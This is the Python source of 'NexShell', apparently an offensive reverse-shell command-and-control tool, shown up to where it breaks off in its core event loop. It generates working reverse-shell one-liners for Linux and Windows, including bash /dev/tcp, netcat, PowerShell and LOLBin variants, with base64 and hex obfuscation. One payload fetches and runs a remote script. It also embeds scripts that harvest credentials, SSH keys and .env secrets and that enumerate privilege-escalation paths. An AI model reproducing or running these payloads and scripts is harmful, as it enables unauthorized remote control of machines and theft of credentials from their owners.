#!/usr/bin/env python3

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  NexShell — Elite Reverse Shell Commander                                  ║
# ║  Nexus of Shell Operations                                                  ║
# ║                                                                              ║
# ║  Author  : vulnquest58                                                       ║
# ║  Version : 1.0.0                                                            ║
# ║  License : MIT                                                               ║
# ║                                                                              ║
# ║  Cross-Platform: Linux · Windows · macOS · BSD                              ║
# ║  Modules: QuickEnum · PrivEsc · CredHarvest · AD Recon                     ║
# ║           Persistence · Lateral Movement · Container Escape · Exfil        ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

__program__   = "nexshell"
__version__   = "1.0.0"
__author__    = "vulnquest58"
__banner__    = r"""
   ███╗   ██╗███████╗██╗  ██╗███████╗██╗  ██╗███████╗██╗     ██╗
   ████╗  ██║██╔════╝╚██╗██╔╝██╔════╝██║  ██║██╔════╝██║     ██║
   ██╔██╗ ██║█████╗   ╚███╔╝ ███████╗███████║█████╗  ██║     ██║
   ██║╚██╗██║██╔══╝   ██╔██╗ ╚════██║██╔══██║██╔══╝  ██║     ██║
   ██║ ╚████║███████╗██╔╝ ██╗███████║██║  ██║███████╗███████╗███████╗
   ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
              Nexus of Shell Operations  ·  Elite Reverse Shell Commander
"""

import os, io, re, sys, ssl, time, gzip, json, shlex, queue, struct
import shutil, socket, signal, base64, secrets, tarfile, logging
import zipfile, inspect, tempfile, platform, itertools, traceback, threading
import subprocess, socketserver

# ── Platform detection ────────────────────────────────────────────────────────
IS_WINDOWS = os.name == 'nt'
IS_UNIX    = not IS_WINDOWS

# ── Unix-only modules (conditional) ──────────────────────────────────────────
if IS_UNIX:
    import tty
    import termios
    import fcntl
    import pty as _pty_mod
else:
    tty      = None
    termios  = None
    fcntl    = None
    _pty_mod = None

# ── Readline (optional — not available everywhere on Windows) ─────────────────
try:
    import readline as _readline
    HAS_READLINE = True
except ImportError:
    _readline    = None
    HAS_READLINE = False

# ── Windows terminal: enable ANSI escape codes ────────────────────────────────
if IS_WINDOWS:
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        # Enable ENABLE_VIRTUAL_TERMINAL_PROCESSING (0x0004) on stdout
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-12), 7)
    except Exception:
        pass
    # Force UTF-8 on Windows stdout/stderr — prevents UnicodeEncodeError
    import io as _io
    if hasattr(sys.stdout, 'buffer'):
        sys.stdout = _io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace', line_buffering=True)
    if hasattr(sys.stderr, 'buffer'):
        sys.stderr = _io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace', line_buffering=True)
    # Windows does not have select() on stdin — provide a shim
    from threading import Event as _WinEvent

from math      import ceil
from glob      import glob
from json      import dumps
from code      import interact
from zlib      import compress
from errno     import EADDRINUSE, EADDRNOTAVAIL
from select    import select
from pathlib   import Path, PureWindowsPath
from argparse  import ArgumentParser, RawTextHelpFormatter
from datetime  import datetime, timedelta
from textwrap  import indent, dedent
from binascii  import Error as binascii_error
from functools import wraps
from contextlib import ExitStack
from collections import deque, defaultdict
from http.server import SimpleHTTPRequestHandler
from urllib.parse import unquote, quote
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen
from concurrent.futures import ThreadPoolExecutor, as_completed
from string import ascii_letters
from random import choice, randint
from threading import Thread, RLock, current_thread

# ── UI Engine (lazy import — fails gracefully if missing) ───────────────
_ui = None
def _load_ui():
    global _ui
    if _ui is None:
        try:
            from modules import ui as _ui_mod
            _ui = _ui_mod
        except Exception:
            _ui = None
    return _ui


rand              = lambda _len: ''.join(choice(ascii_letters) for i in range(_len))
caller            = lambda: inspect.stack()[2].function
chunks            = lambda s, n: (s[0+i:n+i] for i in range(0, len(s), n))
normalize_path    = lambda p: os.path.normpath(os.path.expandvars(os.path.expanduser(p)))
pathlink          = lambda path: (
    f'\x1b]8;;file://{path.parents[0]}\x07{path.parents[0]}{os.path.sep}\x1b]8;;\x07'
    f'\x1b]8;;file://{path}\x07{path.name}\x1b]8;;\x07'
)

# ══════════════════════════════════════════════════════════════════════════════
#  COLOUR ENGINE
# ══════════════════════════════════════════════════════════════════════════════
class paint:
    _codes  = {'RESET':0,'BRIGHT':1,'DIM':2,'UNDERLINE':4,'BLINK':5,'NORMAL':22}
    _colors = {
        'black':0,'red':1,'green':2,'yellow':3,'blue':4,'magenta':5,
        'cyan':6,'orange':208,'white':15,'lightgrey':250,'darkgrey':242,
        'purple':129,'pink':205,'lime':118,'teal':51,
    }
    _escape = lambda codes: f"\001\x1b[{codes}m\002"

    def __init__(self, text=None, colors=None):
        self.text   = str(text) if text is not None else None
        self.colors = colors or []

    def __str__(self):
        if self.colors:
            content = self.text + __class__._escape(__class__._codes['RESET']) if self.text is not None else ''
            return __class__._escape(';'.join(self.colors)) + content
        return self.text

    def __len__(self):   return len(self.text)
    def __add__(self, t): return str(self) + str(t)
    def __mul__(self, n): return __class__(self.text * n, self.colors)

    def __getattr__(self, attr):
        self.colors.clear()
        for color in attr.split('_'):
            if color in __class__._codes:
                self.colors.append(str(__class__._codes[color]))
            else:
                prefix = "3" if color in __class__._colors else "4"
                self.colors.append(prefix + "8;5;" + str(__class__._colors[color.lower()]))
        return self


# ══════════════════════════════════════════════════════════════════════════════
#  LOGGING
# ══════════════════════════════════════════════════════════════════════════════
logging.TRACE = 15
logging.addLevelName(logging.TRACE, 'TRACE')

class CustomFormatter(logging.Formatter):
    templates = {
        logging.CRITICAL: {'color': 'RED',     'prefix': '[!!!]'},
        logging.ERROR:    {'color': 'red',     'prefix': '[-]  '},
        logging.WARNING:  {'color': 'yellow',  'prefix': '[!]  '},
        logging.TRACE:    {'color': 'teal',    'prefix': '[•]  '},
        logging.INFO:     {'color': 'lime',    'prefix': '[+]  '},
        logging.DEBUG:    {'color': 'magenta', 'prefix': '[DBG]'},
    }

    def format(self, record):
        t = self.templates[record.levelno]
        text = f"{t['prefix']} {logging.Formatter.format(self, record)}"
        return f"\x1b[2K\r{getattr(paint(text), t['color'])}\r\n"

def _make_logger(name, level=logging.INFO):
    log = logging.getLogger(name)
    log.setLevel(level)
    h = logging.StreamHandler(sys.stderr)
    h.setFormatter(CustomFormatter())
    log.addHandler(h)
    log.propagate = False
    return log

logger    = _make_logger('nexshell')
cmdlogger = _make_logger('nexshell.cmd')


# ══════════════════════════════════════════════════════════════════════════════
#  OPTIONS  (global config object)
# ══════════════════════════════════════════════════════════════════════════════
class Options:
    def __init__(self):
        self.interface               = 'any'
        self.ports                   = [4444]
        self.default_listener_port   = 4444
        self.maintain                = 1
        self.histlength              = 1000
        self.max_open_files          = 5
        self.max_sessions            = 5
        self.network_buffer_size     = 8192
        self.upload_random_suffix    = False
        self.no_upgrade              = False
        self.no_attach               = False
        self.single_session          = False
        self.basedir                 = Path.home() / f'.{__program__}'
        self.basedir.mkdir(parents=True, exist_ok=True)
        self.debug                   = False
        self.escape                  = {'key': 'F12', 'sequence': b'\x1b[24~'}
        self.jitter                  = 0          # ms jitter between commands (stealth)
        self.stealth_mode            = False      # anti-forensics, no disk writes on target
        self.auto_enum               = False      # auto-run QuickEnum on new sessions
        self.shell_quality           = True       # show shell quality score on connect

options = Options()


# ══════════════════════════════════════════════════════════════════════════════
#  SHELL INTELLIGENCE ENGINE
# ══════════════════════════════════════════════════════════════════════════════
SHELL_QUALITY = {
    'dumb':     (0,  paint('●').red,     'Dumb    '),
    'basic':    (1,  paint('●').yellow,  'Basic   '),
    'readline': (2,  paint('●').orange,  'Readline'),
    'pty':      (3,  paint('●').lime,    'PTY     '),
}

OS_FINGERPRINTS = {
    'linux':   ['uid=', '/bin/bash', '/bin/sh', 'Linux', 'GNU', '/etc/'],
    'windows': ['Windows', 'SYSTEM', 'cmd.exe', 'powershell', 'NT AUTHORITY',
                'C:\\Windows', 'Microsoft', 'PS C:', 'USERPROFILE', 'SystemRoot'],
    'macos':   ['Darwin', 'macOS', 'brew', '/Users/', 'dylib'],
    'bsd':     ['FreeBSD', 'OpenBSD', 'NetBSD', 'DragonFly'],
}

def detect_os(banner: str) -> str:
    b = banner.lower()
    if any(w.lower() in b for w in OS_FINGERPRINTS['windows']): return 'Windows'
    if any(w.lower() in b for w in OS_FINGERPRINTS['macos']):   return 'macOS'
    if any(w.lower() in b for w in OS_FINGERPRINTS['bsd']):     return 'BSD'
    return 'Linux'

def is_windows_session(session) -> bool:
    return getattr(session, 'OS', 'Linux') == 'Windows'

def detect_privilege(whoami_output: str) -> tuple:
    """Returns (is_root: bool, label: str, color_indicator: str)."""
    w = whoami_output.strip().lower()
    if any(x in w for x in ('root', 'system', 'nt authority\\system', 'administrator', 'uid=0')):
        return True, 'ROOT', str(paint('◆ ROOT').red_BRIGHT)
    return False, whoami_output.strip(), str(paint('◇ USER').yellow)

def shell_quality_score(shell_type: str) -> str:
    q = SHELL_QUALITY.get(shell_type.lower(), SHELL_QUALITY['dumb'])
    return f"{q[1]} {q[2]} (score: {q[0]}/3)"


# ══════════════════════════════════════════════════════════════════════════════
#  PAYLOAD GENERATOR  (enhanced with obfuscation)
# ══════════════════════════════════════════════════════════════════════════════
class PayloadGenerator:
    """Cross-platform reverse shell payload generator with obfuscation."""
    SHELLS = ['bash', 'sh', 'zsh', 'python3', 'python', 'ruby', 'perl', 'php',
              'powershell', 'nc', 'ncat', 'busybox', 'curl', 'wget', 'node',
              'mshta', 'wmic', 'certutil', 'regsvr32', 'rundll32']

    @staticmethod
    def bash(host, port):
        return f'bash -i >& /dev/tcp/{host}/{port} 0>&1'

    @staticmethod
    def bash_196(host, port):
        return f'exec 196<>/dev/tcp/{host}/{port}; sh <&196 >&196 2>&196'

    @staticmethod
    def sh(host, port):
        return f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {host} {port} >/tmp/f'

    @staticmethod
    def python3(host, port):
        return (f"python3 -c 'import socket,subprocess,os;s=socket.socket();"
                f"s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);"
                f"os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                f"subprocess.call([\"/bin/sh\",\"-i\"])'")

    @staticmethod
    def perl(host, port):
        return (f"perl -e 'use Socket;$i=\"{host}\";$p={port};"
                f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                f"connect(S,sockaddr_in($p,inet_aton($i)));"
                f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'")

    @staticmethod
    def ruby(host, port):
        return (f"ruby -rsocket -e 'f=TCPSocket.open(\"{host}\",{port});"
                f"[0,1,2].each{{|fd| syscall(33,f.fileno,fd)}};exec(\"/bin/sh -i\")'")

    @staticmethod
    def php(host, port):
        return (f'php -r \'$sock=fsockopen("{host}",{port});'
                f'exec("/bin/sh -i <&3 >&3 2>&3");\'')

    @staticmethod
    def nc(host, port):
        return f'nc -e /bin/sh {host} {port}'

    @staticmethod
    def ncat(host, port):
        return f'ncat {host} {port} -e /bin/bash'

    @staticmethod
    def busybox(host, port):
        return f'busybox nc {host} {port} -e /bin/sh'

    @staticmethod
    def powershell(host, port):
        cmd = (f'$client=New-Object System.Net.Sockets.TCPClient(\"{host}\",{port});'
               f'$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};'
               f'while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){{'
               f'$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);'
               f'$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+"PS "+(pwd).Path+"> ";'
               f'$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);'
               f'$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()')
        return f'powershell -nop -NonI -ep bypass -c "{cmd}"'

    @staticmethod
    def mshta(host, port):
        cmd = (f'$c=New-Object Net.Sockets.TCPClient("{host}",{port});'
               f'$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};'
               f'while(($i=$s.Read($b,0,$b.Length))-ne 0){{'
               f'$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);'
               f'$r=(iex $d 2>&1|Out-String);'
               f'$sb=([Text.Encoding]::ASCII).GetBytes($r+"PS "+(pwd).Path+"> ");'
               f'$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()')
        enc = base64.b64encode(cmd.encode('utf-16-le')).decode()
        return f'mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -enc {enc}"",0:close")'

    @staticmethod
    def wmic(host, port):
        cmd = (f'$c=New-Object Net.Sockets.TCPClient("{host}",{port});'
               f'$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};'
               f'while(($i=$s.Read($b,0,$b.Length))-ne 0){{'
               f'$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);'
               f'$r=(iex $d 2>&1|Out-String);'
               f'$sb=([Text.Encoding]::ASCII).GetBytes($r+"PS "+(pwd).Path+"> ");'
               f'$s.Write($sb,0,$sb.Length)}};$c.Close()')
        enc = base64.b64encode(cmd.encode('utf-16-le')).decode()
        return f'wmic process call create "powershell -nop -ep bypass -enc {enc}"'

    @staticmethod
    def conptyshell(host, port):
        setup  = ('IEX(New-Object Net.WebClient).DownloadString('
                  "'https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1');")
        invoke = f'Invoke-ConPtyShell -RemoteIp {host} -RemotePort {port} -Rows 50 -Cols 220'
        enc    = base64.b64encode((setup + invoke).encode('utf-16-le')).decode()
        return f'powershell -nop -NonI -ep bypass -enc {enc}'

    @staticmethod
    def regsvr32(host, port):
        return f'regsvr32 /s /n /u /i:http://{host}:{port}/payload.sct scrobj.dll'

    @classmethod
    def obfuscate_b64(cls, payload: str) -> str:
        encoded = base64.b64encode(payload.encode()).decode()
        return f'echo {encoded}|base64 -d|sh'

    @classmethod
    def obfuscate_hex(cls, payload: str) -> str:
        hex_str = payload.encode().hex()
        return f'echo {hex_str}|xxd -r -p|sh'

    @classmethod
    def all_payloads(cls, host: str, port: int, obfuscate: bool = False,
                     target_os: str = 'all') -> list:
        linux_generators = [
            ('bash',               cls.bash),
            ('bash-196',           cls.bash_196),
            ('sh (mkfifo)',        cls.sh),
            ('python3',            cls.python3),
            ('perl',               cls.perl),
            ('ruby',               cls.ruby),
            ('php',                cls.php),
            ('nc',                 cls.nc),
            ('ncat',               cls.ncat),
            ('busybox',            cls.busybox),
        ]
        windows_generators = [
            ('powershell',         cls.powershell),
            ('mshta (LOLBin)',     cls.mshta),
            ('wmic (LOLBin)',      cls.wmic),
            ('conptyshell (PTY)',  cls.conptyshell),
            ('regsvr32 (LOLBin)', cls.regsvr32),
        ]

        if target_os == 'windows':
            generators = windows_generators
        elif target_os == 'linux':
            generators = linux_generators
        else:
            generators = linux_generators + windows_generators
        results = []
        for name, fn in generators:
            try:
                payload = fn(host, port)
                entry = {'name': name, 'payload': payload}
                if obfuscate:
                    entry['b64']  = cls.obfuscate_b64(payload)
                    entry['hex']  = cls.obfuscate_hex(payload)
                results.append(entry)
            except Exception:
                pass
        return results

    @classmethod
    def display(cls, host: str, port: int, obfuscate: bool = False,
                target_os: str = 'all'):
        payloads = cls.all_payloads(host, port, obfuscate, target_os)
        os_icons = {'linux': 'Linux', 'windows': 'Windows', 'all': 'All Platforms'}
        os_label_str = os_icons.get(target_os, 'All')
        os_label = {
            'linux':   paint(f'[Linux]').lime,
            'windows': paint(f'[Windows]').cyan,
            'all':     paint(f'[All Platforms]').purple,
        }.get(target_os, paint('[All]').purple)
        print(f'\n  {paint("NexShell Payload Arsenal").purple_BRIGHT}  '
              f'{paint(f"-> {host}:{port}").teal}  {os_label}\n')
        linux_done = False
        for i, p in enumerate(payloads, 1):
            name = p["name"]
            # Section headers
            if target_os == 'all':
                if not linux_done and any(x in name for x in ['powershell','mshta','wmic','conpty','regsvr']):
                    linux_done = True
                    print(f'  {paint("-- Windows --------------------------------------------------").darkgrey}')
                elif i == 1:
                    print(f'  {paint("-- Linux ----------------------------------------------------").darkgrey}')
            # Build colored name — pad using str operations
            if 'LOLBin' in name or 'PTY' in name:
                col_str = str(paint(name).orange)
            else:
                col_str = str(paint(name).cyan)
            # Pad to fixed width (accounting for ANSI escape codes — use raw name for width)
            pad = max(0, 28 - len(name))
            print(f'  {paint(f"[{i:02d}]").purple} {col_str}{" " * pad} {paint(p["payload"]).white}')
            if obfuscate:
                print(f'       {paint("base64:").darkgrey} {p.get("b64","")}')
                print(f'       {paint("hex:   ").darkgrey} {p.get("hex","")}')
            print()


# ══════════════════════════════════════════════════════════════════════════════
#  RECON MODULES
# ══════════════════════════════════════════════════════════════════════════════
QUICKENUM_SCRIPT = r"""
echo "=== [NexShell QuickEnum] ==="
echo "--- OS Info ---"
uname -a 2>/dev/null; cat /etc/os-release 2>/dev/null | head -5
echo "--- Current User ---"
id; whoami; groups
echo "--- Sudo Rights ---"
sudo -l 2>/dev/null || echo "[no sudo]"
echo "--- SUID Binaries ---"
find / -perm -4000 -type f 2>/dev/null | head -20
echo "--- Writable /etc Files ---"
find /etc -writable -type f 2>/dev/null | head -10
echo "--- Cron Jobs ---"
cat /etc/crontab 2>/dev/null; ls /etc/cron* 2>/dev/null
echo "--- Network Interfaces ---"
ip a 2>/dev/null || ifconfig 2>/dev/null
echo "--- Open Ports (internal) ---"
ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null | head -20
echo "--- Interesting Files ---"
find / -name "*.conf" -o -name "*.bak" -o -name "*.old" 2>/dev/null | grep -v proc | head -20
echo "--- History Files ---"
cat ~/.bash_history 2>/dev/null | tail -30
echo "--- SSH Keys ---"
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null | head -5
echo "=== [QuickEnum Done] ==="
"""

CRED_HARVESTER_SCRIPT = r"""
echo "=== [NexShell CredHarvest] ==="
echo "--- /etc/passwd ---"
cat /etc/passwd | grep -v nologin | grep -v false
echo "--- .env files ---"
find / -name ".env" 2>/dev/null | head -10 | xargs grep -l "PASS\|SECRET\|KEY" 2>/dev/null
echo "--- Config files with credentials ---"
grep -rn "password\s*=\|passwd\s*=\|secret\s*=" /etc/ /var/www/ /opt/ 2>/dev/null | grep -v "^Binary" | head -30
echo "--- Database configs ---"
find / -name "*.php" -o -name "config.yml" -o -name "database.yml" 2>/dev/null | xargs grep -l "password\|passwd" 2>/dev/null | head -10
echo "--- SSH authorized_keys ---"
find / -name "authorized_keys" 2>/dev/null | xargs cat 2>/dev/null
echo "=== [CredHarvest Done] ==="
"""

PRIVESC_SCRIPT = r"""
echo "=== [NexShell PrivEsc Advisor] ==="
echo "--- Kernel Version ---"
uname -r
echo "--- Writable PATH dirs ---"
echo $PATH | tr ':' '\n' | xargs -I{} find {} -writable 2>/dev/null
echo "--- SUID with GTFOBins potential ---"
SUID=$(find / -perm -4000 -type f 2>/dev/null)
echo "$SUID"
for b in nmap vim find bash cp python python3 perl ruby wget curl nc netcat awk gdb git strace; do
  echo "$SUID" | grep -q "/$b" && echo "[!] SUID $b found — check GTFOBins!"
done
echo "--- Capabilities ---"
getcap -r / 2>/dev/null | head -20
echo "--- NFS Exports ---"
cat /etc/exports 2>/dev/null
echo "--- Writable service files ---"
find /etc/systemd /lib/systemd -writable -type f 2>/dev/null | head -10
echo "--- Docker socket ---"
ls -la /var/run/docker.sock 2>/dev/null
echo "--- LXD membership ---"
id | grep -q lxd && echo "[!] User in lxd group - container escape possible"
echo "=== [PrivEsc Advisor Done] ==="
"""


# ══════════════════════════════════════════════════════════════════════════════
#  TABLE  (rendering helper)
# ══════════════════════════════════════════════════════════════════════════════
class Table:
    def __init__(self, list_of_lists=[], header=None, fillchar=" ", joinchar=" "):
        self.list_of_lists = list_of_lists
        self.joinchar = joinchar
        self.fillchar  = [fillchar] if isinstance(fillchar, str) else fillchar
        self.data, self.max_row_len, self.col_max_lens = [], 0, []
        if header: self.header = header
        for row in self.list_of_lists: self += row

    @property
    def header(self): ...

    @header.setter
    def header(self, h): self.add_row(h, header=True)

    def __str__(self):
        self.fill()
        return "\n".join([self.joinchar.join(row) for row in self.data])

    def __len__(self): return len(self.data)

    def add_row(self, row, header=False):
        row_len = len(row)
        if row_len > self.max_row_len: self.max_row_len = row_len
        cur = len(self.col_max_lens)
        for _ in range(row_len - cur): self.col_max_lens.append(0)
        for _ in range(cur - row_len): row.append("")
        new_row = []
        for i, el in enumerate(row):
            if not isinstance(el, (str, paint)): el = str(el)
            new_row.append(el)
            if len(el) > self.col_max_lens[i]: self.col_max_lens[i] = len(el)
        if header: self.data.insert(0, new_row)
        else: self.data.append(new_row)

    def __iadd__(self, row):
        self.add_row(row)
        return self

    def fill(self):
        for row in self.data:
            for i, el in enumerate(row):
                fc = self.fillchar[0] if i in [*self.fillchar][1:] else ' '
                row[i] = el + fc * (self.col_max_lens[i] - len(el))


# ══════════════════════════════════════════════════════════════════════════════
#  SIZE  helper
# ══════════════════════════════════════════════════════════════════════════════
class Size:
    units = ("", "K", "M", "G", "T", "P")
    def __init__(self, b): self.bytes = b
    def __str__(self):
        i, s = 0, self.bytes
        while s >= 1024 and i < len(__class__.units)-1: s /= 1024; i += 1
        return f"{s:.1f} {__class__.units[i]}B"

    @classmethod
    def from_str(cls, s):
        if s.isnumeric(): return cls(int(s))
        try:
            n, u = int(s[:-1]), s[-1]
            return cls(n * 1024 ** __class__.units.index(u))
        except ValueError:
            logger.error("Invalid size"); return None


# ══════════════════════════════════════════════════════════════════════════════
#  PROGRESS BAR
# ══════════════════════════════════════════════════════════════════════════════
class PBar:
    pbars = []

    def __init__(self, end, caption="", barlen=None, queue=None, metric=None):
        self.end           = end if isinstance(end, int) else len(end)
        self.active        = self.end > 0
        self.pos           = 0
        self.percent       = 0
        self.caption       = caption
        self.bar           = '█'
        self.barlen        = barlen
        self.percent_prev  = -1
        self.queue         = queue
        self.metric        = metric or (lambda x: f"{x:,}")
        self.check_interval = 1
        if self.queue:
            self.trace_thread = Thread(target=self.trace)
            self.trace_thread.start()
            __class__.render_lock = RLock()
        if metric: Thread(target=self.watch_speed, daemon=True).start()
        __class__.pbars.append(self)
        print("\x1b[?25l", end='', flush=True)
        self.render()

    def __bool__(self): return self.active
    def __enter__(self): return self
    def __exit__(self, *a): self.terminate()

    def trace(self):
        while True:
            data = self.queue.get(); self.queue.task_done()
            if isinstance(data, int): self.update(data)
            elif data is None: break
            else: self.print(data)

    def watch_speed(self):
        self.pos_prev = 0; self.elapsed = 0
        while self:
            time.sleep(self.check_interval)
            self.elapsed += self.check_interval
            self.speed    = self.pos - self.pos_prev
            self.pos_prev = self.pos
            self.speed_avg = self.pos / self.elapsed
            if self.speed_avg: self.eta = int((self.end - self.pos) / self.speed_avg)
            if self: self.render()

    def update(self, step=1):
        if not self: return
        self.pos = min(self.pos + step, self.end)
        self.percent = int(self.pos * 100 / self.end)
        if self.pos >= self.end: self.terminate()
        if self.percent > self.percent_prev: self.render()

    def render_one(self):
        self.percent_prev = self.percent
        left  = f"{self.caption}["
        elapsed = "" if not hasattr(self,'elapsed') else f" | {timedelta(seconds=self.elapsed)}"
        speed   = "" if not hasattr(self,'speed')   else f" | {self.metric(self.speed)}/s"
        eta     = "" if not hasattr(self,'eta')     else f" | ETA {timedelta(seconds=self.eta)}"
        right = f"] {str(self.percent).rjust(3)}% ({self.metric(self.pos)}/{self.metric(self.end)}){speed}{elapsed}{eta}"
        try: cols = os.get_terminal_size().columns
        except OSError: cols = 80
        bar_space = self.barlen or (cols - len(left) - len(right))
        bars  = int(self.percent * bar_space / 100) * self.bar
        empty = '░' * (bar_space - len(bars))
        print(f'\x1b[2K{left}{paint(bars).lime}{paint(empty).darkgrey}{right}\n',
              end='', flush=True)

    def render(self):
        if hasattr(__class__,'render_lock'): __class__.render_lock.acquire()
        for pb in __class__.pbars: pb.render_one()
        print(f"\x1b[{len(__class__.pbars)}A", end='', flush=True)
        if hasattr(__class__,'render_lock'): __class__.render_lock.release()

    def print(self, data):
        if hasattr(__class__,'render_lock'): __class__.render_lock.acquire()
        print(f"\x1b[2K{data}", flush=True); self.render()
        if hasattr(__class__,'render_lock'): __class__.render_lock.release()

    def terminate(self):
        if self.queue and current_thread() != self.trace_thread:
            self.queue.join(); self.queue.put(None)
        if hasattr(__class__,'render_lock'): __class__.render_lock.acquire()
        try:
            if not self: return
            self.active = False
            if hasattr(self,'eta'): del self.eta
            if not any(__class__.pbars):
                self.render()
                print("\x1b[?25h" + '\n' * len(__class__.pbars), end='', flush=True)
                __class__.pbars.clear()
        finally:
            if hasattr(__class__,'render_lock'): __class__.render_lock.release()


# ══════════════════════════════════════════════════════════════════════════════
#  INTERFACES
# ══════════════════════════════════════════════════════════════════════════════
class Interfaces:
    def __str__(self):
        tbl = Table(joinchar=' : ')
        tbl.header = [paint('Interface').purple, paint('IP Address').purple]
        grouped = {}
        for name, ip in self.pairs: grouped.setdefault(name, []).append(ip)
        for name, ips in grouped.items():
            tbl += [paint(name).cyan, paint(', '.join(ips)).yellow]
        return str(tbl)

    def translate(self, iface):
        ifaces = self.list
        if iface in ifaces: return ifaces[iface]
        if iface in ('any','all'): return '0.0.0.0'
        return iface

    @staticmethod
    def ipa(busybox=False):
        interfaces, cur = [], None
        params = (['busybox'] if busybox else []) + ['ip', 'addr']
        try: output = subprocess.check_output(params, stderr=subprocess.DEVNULL).decode()
        except: return interfaces
        for line in output.splitlines():
            m = re.search(r"^\d+:\s+(.+?)(?:@\w+)?:", line)
            if m: cur = m[1]; continue
            if cur:
                ip = re.search(r"\binet (\d+\.\d+\.\d+\.\d+)", line)
                if ip: interfaces.append((cur, ip[1]))
        return interfaces

    @staticmethod
    def ifconfig():
        interfaces, cur = [], None
        try: output = subprocess.check_output(['ifconfig'], stderr=subprocess.DEVNULL).decode()
        except: return interfaces
        for line in output.splitlines():
            if line and not line[0].isspace():
                h = re.match(r'(\S+?):?\s', line); cur = h[1] if h else None
            elif cur:
                ip = re.search(r'\binet (?:addr:)?(\d+\.\d+\.\d+\.\d+)', line)
                if ip: interfaces.append((cur, ip[1]))
        return interfaces

    @property
    def pairs(self):
        if shutil.which("ip"):      return self.ipa()
        if shutil.which("ifconfig"): return self.ifconfig()
        if shutil.which("busybox"): return self.ipa(busybox=True)
        return []

    @property
    def list(self):
        r = {}
        for name, ip in self.pairs: r.setdefault(name, ip)
        return r

    @property
    def ips(self):
        seen, r = set(), []
        for _, ip in self.pairs:
            if ip not in seen: seen.add(ip); r.append(ip)
        return r

    @property
    def list_all(self):
        seen, r = set(), []
        for name, ip in self.pairs:
            for item in (name, ip):
                if item not in seen: seen.add(item); r.append(item)
        return r


# ══════════════════════════════════════════════════════════════════════════════
#  LINE BUFFER
# ══════════════════════════════════════════════════════════════════════════════
class LineBuffer:
    def __init__(self, length):
        self.len   = length
        self.lines = deque(maxlen=self.len)

    def __lshift__(self, data):
        if isinstance(data, str): data = data.encode()
        if self.lines and not self.lines[-1].endswith(b'\n'):
            current = self.lines.pop()
        else:
            current = b''
        self.lines.extend((current + data).split(b'\n'))
        return self

    def __bytes__(self): return b'\n'.join(self.lines)


def stdout(data, record=True):
    os.write(sys.stdout.fileno(), data)
    if record: core.output_line_buffer << data


def ask(text):
    while True:
        try:
            return input(f"{paint(f'[?] {text}').yellow}")
        except EOFError:
            print()
            if not sys.stdin.isatty(): return ''
        except KeyboardInterrupt:
            print("^C"); return ' '


# ══════════════════════════════════════════════════════════════════════════════
#  CONTROL QUEUE
# ══════════════════════════════════════════════════════════════════════════════
class ControlQueue:
    def __init__(self):
        self._out, self._in = os.pipe()
        self.queue = queue.Queue()
        self._lock = threading.Lock()

    def fileno(self): return self._out

    def __lshift__(self, command):
        with self._lock:
            self.queue.put(command)
            try: os.write(self._in, b'\x00')
            except OSError: pass

    def get(self):
        try: os.read(self._out, 1)
        except OSError: return 'stop'
        return self.queue.get()

    def clear(self):
        with self._lock:
            n = 0
            while not self.queue.empty():
                try: self.queue.get_nowait(); n += 1
                except queue.Empty: break
            try: os.read(self._out, n)
            except OSError: pass

    def close(self):
        for fd in (self._in, self._out):
            try: os.close(fd)
            except OSError: pass


# ══════════════════════════════════════════════════════════════════════════════
#  CORE ENGINE
# ══════════════════════════════════════════════════════════════════════════════
class Core:
    def __init__(self):
        self.started          = False
        self.control          = ControlQueue()
        self.rlist            = [self.control]
        self.wlist            = []
        self.attached_session = None
        self.conn_semaphore   = threading.Semaphore(5)
        self.listener_counter  = itertools.count(1)
        self.session_counter   = itertools.count(1)
        self.forwarding_counter = itertools.count(1)
        self.sessions          = {}
        self.listeners         = {}
        self.forwardings       = {}
        self.output_line_buffer = LineBuffer(1)
        self.wait_input        = False
        self.counter_lock      = threading.Lock()

    def __getattr__(self, name):
        if name == 'new_listenerID':
            with self.counter_lock: return next(self.listener_counter)
        if name == 'new_sessionID':
            with self.counter_lock: return next(self.session_counter)
        if name == 'new_forwardingID':
            with self.counter_lock: return next(self.forwarding_counter)
        raise AttributeError(name)

    @property
    def hosts(self):
        r = {}
        for s in tuple(self.sessions.values()):
            name = getattr(s, 'name', None)
            if name: r.setdefault(name, []).append(s)
        return r

    def start(self):
        self.started = True
        threading.Thread(target=self.loop, name="Core", daemon=True).start()

    def loop(self):
        while self.started:
            try:
                readables, writables, _ = select(self.rlist, self.wlist, [])
            except (ValueError, OSError):
                for lst in (self.rlist, self.wlist):
                    for x in tuple(lst):
                        try:
                            if x.fileno() < 0: lst.remove(x)
                        except Exception:
                            try: lst.remove(x)
                            except ValueError: pass
                continue

